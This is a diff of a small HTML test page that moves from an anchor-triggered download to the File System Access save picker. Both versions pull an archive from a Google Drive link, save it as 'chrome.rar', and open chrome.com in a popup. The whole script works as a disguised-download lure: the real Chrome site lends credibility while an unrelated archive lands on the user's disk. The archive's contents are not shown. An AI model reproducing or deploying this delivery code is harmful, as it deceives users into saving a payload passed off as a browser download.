@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Download File Picker Test</title>
+<title>Popup Save File Test</title>
 <style>
 body { font-family:sans-serif;padding:20px }
 button { padding:12px 18px;font-size:16px }
@@ -11,48 +11,53 @@ pre { background:#111;color:#0f0;padding:10px }
 </head>
 <body>
 
-<h3>Download File Picker Test</h3>
-<button id="btn">Download File</button>
+<h3>Popup Save File Test</h3>
+<button id="btn">Open Popup</button>
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
 const log = m => logEl.textContent += m + "\n";
 
-document.getElementById("btn").onclick = () => {
+document.getElementById("btn").onclick = async () => {
 
-  log("[1] User click received");
+  log("[1] Opening popup");
 
-  const url = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
-
-  const a = document.createElement("a");
-  a.href = url;
-  a.setAttribute("download","chrome.rar");
-
-  document.body.appendChild(a);
-
-  log("[2] Triggering save request");
-
-  a.click();
-
-  a.remove();
-
-  const w = window.open(
-    "https://chrome.com",
-    "_blank",
-    `
-    width=${screen.availWidth},
-    height=${screen.availHeight},
-    left=0,
-    top=0
-    `
-  );
+  const w = window.open("about:blank","_blank");
 
   if(!w){
-    log("[ERROR] Popup blocked");
-  } else {
-    log("[3] Popup opened");
+    log("[ERROR] popup blocked");
+    return;
   }
+
+  try {
+
+    log("[2] Opening save file picker");
+
+    const handle = await window.showSaveFilePicker({
+      suggestedName: "chrome.rar"
+    });
+
+    const writable = await handle.createWritable();
+
+    const response = await fetch(
+      "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL"
+    );
+
+    const blob = await response.blob();
+
+    await writable.write(blob);
+    await writable.close();
+
+    log("[3] File saved");
+
+  } catch(e) {
+    log("[ERROR] " + e);
+  }
+
+  log("[4] Navigating popup to chrome.com");
+
+  w.location.href = "https://chrome.com";
 
 };
 </script>
